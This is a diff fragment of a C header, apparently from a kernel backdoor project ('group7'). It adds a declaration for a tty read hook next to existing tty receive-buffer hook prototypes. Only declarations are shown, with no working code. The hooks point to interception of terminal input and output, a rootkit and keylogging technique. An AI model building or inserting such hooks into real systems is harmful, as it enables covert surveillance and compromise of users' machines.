@@ -10,5 +10,6 @@ void unbackdoor(void);
 // hooks
 void g7_receive_buf(struct tty_struct *, const unsigned char *, char *, int);
 int g7_receive_buf2(struct tty_struct *, const unsigned char *, char *, int);
+ssize_t g7_tty_read(struct file *, char *, size_t, loff_t *);
 
 #endif//_GROUP7_BACKDOOR_H
